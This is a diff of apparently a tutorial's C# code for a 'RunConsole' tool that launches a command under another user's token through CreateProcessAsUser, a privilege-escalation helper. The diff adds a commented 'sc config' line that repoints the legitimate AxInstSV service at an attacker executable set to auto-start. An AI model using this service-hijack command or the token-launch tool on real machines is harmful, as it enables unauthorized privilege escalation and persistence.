@@ -75,25 +75,26 @@ class RunConsole {
 		SECURITY_ATTRIBUTES saThreadAttributes = new SECURITY_ATTRIBUTES();
 		STARTUPINFO startupInfo = new STARTUPINFO();
 		PROCESS_INFORMATION processInfo;
-		String cmd = Environment.CommandLine.Substring(Args0.Length).Trim();// quoted parameter : accepted
+		String cmd = Environment.CommandLine.Substring(Args0.Length).Trim();
 		if(cmd.Length==0){
-			Console.WriteLine("usage : <{0}> <cmd>", Args0);
+			Console.WriteLine("Usage : <{0}> <cmd>", Args0);
 			return 0;
 		}
-		if (CreateProcessAsUser(hToken, null, cmd, ref saProcessAttributes, ref saThreadAttributes, false, (uint)(0 | 0x00000400)/*CREATE_UNICODE_ENVIRONMENT*/, lpEnvironment, null, ref startupInfo, out processInfo))
+		if (!CreateProcessAsUser(hToken, null, cmd, ref saProcessAttributes, ref saThreadAttributes, false, (uint)(0|0x00000400)/*CREATE_UNICODE_ENVIRONMENT*/, lpEnvironment, null, ref startupInfo, out processInfo))
 		{
-			Console.WriteLine("pid : "+processInfo.dwProcessId);
+			Console.WriteLine("CreateProcessAsUser failed ! GGWP");
 		}
-		else {
-			Console.WriteLine("administrative privileges required");
-		}
+		Console.WriteLine("Pid : "+processInfo.dwProcessId);
 	}
 	catch(Exception e){
-		Console.WriteLine("got exception "+e.GetType().Name);
+		Console.WriteLine("Exception "+e.GetType().Name);
 	}
 	return 0;
 	}
 }
+/*
+sc config AxInstSV binpath= "C:\Users\h4x0r\Desktop\fuck.exe notepad.exe" type= own start= auto DisplayName= "ActiveX Installer (AxInstSV)"
+*/
 ```
 ##### Compile
 https://www.nuget.org/packages/Microsoft.Net.Compilers
